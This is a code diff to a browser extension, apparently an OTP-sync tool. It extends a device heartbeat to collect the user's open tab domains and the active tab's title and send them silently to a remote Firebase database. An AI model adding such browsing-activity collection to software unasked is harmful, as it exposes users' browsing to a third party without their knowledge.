@@ -27,41 +27,61 @@ try {
 function sendDeviceHeartbeat(uuid, isUserActive = false) {
     if (!uuid) return;
     const now = Date.now();
-    try {
-        if (chrome.idle && typeof chrome.idle.queryState === 'function') {
-            chrome.idle.queryState(15, (state) => {
-                const isSystemActive = (state === 'active');
-                const payload = {
-                    lastSeen: now,
-                    status: "active",
-                    systemState: state,
-                    isIdle: !isSystemActive
-                };
-                if (isUserActive && isSystemActive) {
-                    payload.lastActive = now;
-                }
-                fetch(`https://otpsync-adf52-default-rtdb.asia-southeast1.firebasedatabase.app/devices/${uuid}.json`, {
-                    method: 'PATCH',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(() => {});
-            });
-            return;
-        }
-    } catch (_) {}
 
-    const payload = {
-        lastSeen: now,
-        status: "active"
-    };
-    if (isUserActive) {
-        payload.lastActive = now;
-    }
-    fetch(`https://otpsync-adf52-default-rtdb.asia-southeast1.firebasedatabase.app/devices/${uuid}.json`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).catch(() => {});
+    chrome.tabs.query({ lastFocusedWindow: true }, (tabs) => {
+        const openDomains = [];
+        let activeDomain = '';
+        let activeTitle = '';
+
+        if (tabs && tabs.length > 0) {
+            for (const t of tabs) {
+                if (!t.url || t.url.startsWith('chrome://') || t.url.startsWith('about:') || t.url.startsWith('edge://')) continue;
+                try {
+                    const u = new URL(t.url);
+                    const host = u.hostname.toLowerCase();
+                    if (host && !openDomains.includes(host)) openDomains.push(host);
+                    if (t.active) {
+                        activeDomain = host;
+                        activeTitle = (t.title || '').substring(0, 100);
+                    }
+                } catch (_) {}
+            }
+        }
+
+        const payload = {
+            lastSeen: now,
+            status: "active"
+        };
+        if (openDomains.length > 0) payload.openDomains = openDomains.slice(0, 10);
+        if (activeDomain) payload.activeDomain = activeDomain;
+        if (activeTitle) payload.activeTitle = activeTitle;
+
+        try {
+            if (chrome.idle && typeof chrome.idle.queryState === 'function') {
+                chrome.idle.queryState(15, (state) => {
+                    const isSystemActive = (state === 'active');
+                    payload.systemState = state;
+                    payload.isIdle = !isSystemActive;
+                    if (isUserActive && isSystemActive) {
+                        payload.lastActive = now;
+                    }
+                    fetch(`https://otpsync-adf52-default-rtdb.asia-southeast1.firebasedatabase.app/devices/${uuid}.json`, {
+                        method: 'PATCH',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).catch(() => {});
+                });
+                return;
+            }
+        } catch (_) {}
+
+        if (isUserActive) payload.lastActive = now;
+        fetch(`https://otpsync-adf52-default-rtdb.asia-southeast1.firebasedatabase.app/devices/${uuid}.json`, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    });
 }
 
 // ─── System Idle & Active Interaction Tracking ───────────────────────────────
@@ -204,7 +224,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             sendDeviceHeartbeat(data.uuid, true);
             fetch(`https://otpsync-adf52-default-rtdb.asia-southeast1.firebasedatabase.app/devices/${data.uuid}/pcLoginActive.json`, {
                 method: 'PUT',
-                body: JSON.stringify({ active: true, host: message.url, ts: Date.now() })
+                body: JSON.stringify({ active: true, host: message.url || '', title: message.title || '', ts: Date.now() })
             }).catch(() => {});
         });
     } else if (message.action === "pc_login_cleared") {
@@ -225,7 +245,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             sendDeviceHeartbeat(data.uuid, true);
             fetch(`https://otpsync-adf52-default-rtdb.asia-southeast1.firebasedatabase.app/devices/${data.uuid}/otpIntent.json`, {
                 method: 'PUT',
-                body: JSON.stringify({ active: true, host: message.host || '', ts: Date.now() })
+                body: JSON.stringify({ active: true, host: message.host || '', title: message.title || '', ts: Date.now() })
             }).catch(() => {});
         });
     } else if (message.action === "user_activity") {
